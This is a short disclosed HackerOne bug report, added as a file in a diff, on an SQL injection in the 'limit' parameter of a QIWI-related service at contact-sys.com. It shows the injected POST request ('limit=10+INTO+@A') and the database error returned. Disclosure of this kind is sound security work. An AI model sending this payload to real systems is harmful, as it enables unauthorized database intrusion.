@@ -1,0 +1,25 @@
+ReportLink:https://hackerone.com/reports/164945
+WeaknessName:SQL Injection
+Reporter:https://hackerone.com/bobrov
+ReportedTo:QIWI(qiwi)
+BountyAmount:250.0
+Severity:high
+State:Closed
+DateOfDisclosure:18.11.2018 7:26:39
+
+Summary:
+
+**Уязвимый сценарий:**████
+**Уязвимый параметр:** limit
+```
+POST█████ HTTP/1.1
+Host: contact-sys.com
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Content-Length: 59
+
+country_code=RU&send_rec_type=1&action=index&term=&limit=10+INTO+@A
+```
+Ответ
+```
+{"error":"SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns","errorCode":"SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns"}
+```
